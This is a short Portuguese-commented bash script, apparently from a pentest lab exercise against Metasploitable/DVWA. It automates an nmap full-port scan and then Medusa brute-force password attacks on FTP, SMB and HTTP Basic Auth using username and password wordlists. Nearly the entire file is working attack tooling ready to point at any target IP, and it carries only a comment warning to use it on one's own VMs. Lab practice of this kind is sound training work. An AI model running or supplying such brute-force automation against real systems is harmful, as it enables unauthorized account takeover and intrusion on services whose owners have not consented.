#!/usr/bin/env bash
# script.sh — automatiza reconhecimento e execução de brute-force com Medusa
# Uso: ./script.sh
# ATENÇÃO: rodar apenas em ambiente controlado / VMs suas.

set -euo pipefail

# ------- CONFIGURAÇÃO (edite conforme seu ambiente) --------
TARGET="192.168.56.101"        # <--- altere para o IP do alvo (Metasploitable/DVWA)
USER_FILE="users.txt"          # arquivo com usernames (um por linha)
PASS_FILE="pass.txt"           # arquivo com senhas (um por linha)
RESULTS_DIR="results"
IMAGES_DIR="images"            # opcional (já existe)
NMAP_OUTPUT="$RESULTS_DIR/nmap_scan.txt"
FTP_LOG="$RESULTS_DIR/medusa_ftp.txt"
SMB_LOG="$RESULTS_DIR/medusa_smbnt.txt"
HTTP_BASIC_LOG="$RESULTS_DIR/medusa_http_basic.txt"
THREADS=10                     # número de threads paralelas do Medusa (ajuste conforme VM)
# ----------------------------------------------------------

mkdir -p "$RESULTS_DIR"

echo "Iniciando checklist de execução: $(date --iso-8601=seconds)"
echo "Alvo: $TARGET"
echo "Usuários: $USER_FILE | Senhas: $PASS_FILE"
echo ""

# 1) Reconhecimento rápido com nmap (ports + version)
echo "[*] Executando nmap (scan rápido) — salva em $NMAP_OUTPUT"
nmap -sV -p- --min-rate 1000 "$TARGET" -oN "$NMAP_OUTPUT" || echo "[!] nmap finalizado com código != 0"

# 2) Brute-force FTP com Medusa
echo ""
echo "[*] Executando Medusa -> FTP (salvo em $FTP_LOG)"
medusa -M ftp -h "$TARGET" -U "$USER_FILE" -P "$PASS_FILE" -t "$THREADS" -O "$FTP_LOG" || echo "[!] medusa ftp finalizada com código != 0"

# 3) Password spraying / brute-force SMB (smbnt)
echo ""
echo "[*] Executando Medusa -> SMBNT (salvo em $SMB_LOG)"
medusa -M smbnt -h "$TARGET" -U "$USER_FILE" -P "$PASS_FILE" -t "$THREADS" -O "$SMB_LOG" || echo "[!] medusa smbnt finalizada com código != 0"

# 4) HTTP Basic Auth (caso exista)
echo ""
echo "[*] Executando Medusa -> HTTP Basic Auth (se aplicável) (salvo em $HTTP_BASIC_LOG)"
medusa -M http -h "$TARGET" -U "$USER_FILE" -P "$PASS_FILE" -t "$THREADS" -O "$HTTP_BASIC_LOG" -m AUTH:basic || echo "[!] medusa http finalizada com código != 0"

# 5) Resumo dos logs (primeiras linhas)
echo ""
echo "==== RESUMO (primeiras linhas dos logs) ===="
for f in "$FTP_LOG" "$SMB_LOG" "$HTTP_BASIC_LOG" "$NMAP_OUTPUT"; do
  if [ -f "$f" ]; then
    echo ""
    echo "----- $(basename "$f") -----"
    head -n 40 "$f" || true
  else
    echo ""
    echo "----- $(basename "$f") NÃO EXISTE -----"
  fi
done

echo ""
echo "Execução finalizada: $(date --iso-8601=seconds)"
echo "Logs em: $RESULTS_DIR/"
